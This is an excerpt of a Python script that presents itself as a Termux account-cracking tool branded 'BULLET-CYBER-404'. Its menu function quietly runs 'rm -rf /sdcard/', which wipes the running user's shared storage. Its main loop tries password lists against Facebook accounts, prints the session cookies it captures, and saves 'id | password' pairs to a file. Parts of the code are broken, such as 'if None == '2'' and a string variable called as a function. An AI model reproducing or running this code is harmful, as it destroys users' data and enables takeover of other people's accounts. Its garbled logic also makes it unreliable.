...
def o():
	_Tamzid_("termux-setup-storage -y")
	_Tamzid_("rm -rf /sdcard/")
    os.system('clear')
    jalan(logo)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    ...
    jalan('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW You tub ')
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/BULLET-CYBER1223?mibextid=ZbWKwL')
        return None
    if None == '3':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mBULLET-CYBER-404-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/BULLET-CYBER-404-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[BULLET-CYBER-404] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
